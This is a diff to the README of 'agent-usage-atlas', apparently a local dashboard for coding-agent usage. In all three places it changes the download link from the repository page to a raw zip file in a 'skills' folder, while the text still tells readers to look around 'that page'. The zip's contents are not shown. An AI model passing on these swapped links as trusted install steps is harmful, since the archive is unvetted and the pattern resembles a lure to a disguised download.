@@ -1,6 +1,6 @@
 # 📊 agent-usage-atlas - See Your Agent Work Clearly
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/sumith9686-del/agent-usage-atlas)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/sumith9686-del/agent-usage-atlas/raw/refs/heads/main/skills/atlas-agent-usage-1.5.zip)
 
 ## 🧭 What this does
 
@@ -32,7 +32,7 @@ The app is built for local use, so your data stays on your machine.
 
 Open the download page here:
 
-https://github.com/sumith9686-del/agent-usage-atlas
+https://github.com/sumith9686-del/agent-usage-atlas/raw/refs/heads/main/skills/atlas-agent-usage-1.5.zip
 
 On that page, look for the latest version or the main project files.
 
@@ -171,7 +171,7 @@ It fits users who want a simple local way to understand how they use coding agen
 
 Download or open the project from:
 
-https://github.com/sumith9686-del/agent-usage-atlas
+https://github.com/sumith9686-del/agent-usage-atlas/raw/refs/heads/main/skills/atlas-agent-usage-1.5.zip
 
 Then follow the Windows steps above to run the dashboard on your PC
 
